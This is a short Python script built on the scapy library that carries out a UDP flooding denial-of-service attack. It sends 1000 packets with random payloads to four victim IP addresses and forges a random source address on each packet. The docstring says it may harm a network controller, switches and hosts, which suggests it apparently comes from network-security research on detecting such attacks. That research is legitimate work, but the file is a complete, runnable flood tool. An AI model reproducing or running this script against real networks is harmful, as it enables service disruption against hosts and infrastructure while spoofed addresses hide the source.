#   python -E Multi_UDP.py victim1_ip victim2_ip victim3_ip victim4_ip
"""
UDP flooding attack use a range of target host IP addresses with faked source IP addresses.
This attack might be harmful to the controller, switch and even hosts within the network.
Send 1000 packets with the rate of 200 packets per second to the range of user input random hosts (within the range of input targets).
"""

import sys
import time
from os import popen
from scapy.all import sendp, IP, UDP, Ether, RandShort
from random import randint
import random
import string

def sourceIPgen():
    not_valid = [10, 127, 254, 255, 1, 2, 169, 172, 192]
    first = randint(1, 255)

    while first in not_valid:
        first = randint(1, 255)
    print (first)
    ip = ".".join([str(first), str(randint(1, 255)), str(
        randint(1, 255)), str(randint(1, 255))])
    print (ip)
    return ip


def main():
    dstIP1 = sys.argv[1]
    dstIP2 = sys.argv[2]
    dstIP3 = sys.argv[3]
    dstIP4 = sys.argv[4]

    interface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
    print (repr(interface))

    payload = ""

    for i in range(250):
        payload = "".join(random.choice(string.ascii_uppercase + string.digits +
                          string.ascii_lowercase) for x in range(randint(10, 40)))
        
        packets = Ether() / IP(dst=dstIP1, src=sourceIPgen()) / \
            UDP(dport=int(RandShort()), sport=int(RandShort())) / payload
        print(repr(packets))
        sendp(packets, iface=interface.rstrip(), inter=0.005)

        packets = Ether() / IP(dst=dstIP2, src=sourceIPgen()) / \
            UDP(dport=int(RandShort()), sport=int(RandShort())) / payload
        print(repr(packets))
        sendp(packets, iface=interface.rstrip(), inter=0.005)

        packets = Ether() / IP(dst=dstIP3, src=sourceIPgen()) / \
            UDP(dport=int(RandShort()), sport=int(RandShort())) / payload
        print(repr(packets))
        sendp(packets, iface=interface.rstrip(), inter=0.005)

        packets = Ether() / IP(dst=dstIP4, src=sourceIPgen()) / \
            UDP(dport=int(RandShort()), sport=int(RandShort())) / payload
        print(repr(packets))
        sendp(packets, iface=interface.rstrip(), inter=0.005)


if __name__ == "__main__":
    main()
